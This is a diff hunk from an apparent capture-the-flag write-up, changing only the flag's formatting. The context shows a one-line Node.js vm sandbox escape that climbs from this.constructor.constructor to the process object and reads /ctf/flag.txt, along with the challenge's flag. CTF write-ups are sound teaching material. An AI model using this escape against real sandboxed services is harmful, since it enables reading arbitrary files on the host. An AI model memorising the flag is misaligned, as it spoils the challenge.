@@ -29,4 +29,4 @@ Final Exploit:
 this.constructor.constructor("return this.process")().mainModule.require("fs").readFileSync("/ctf/flag.txt").toString();
 ```
 
-Flag: flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}
+Flag: `flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}`
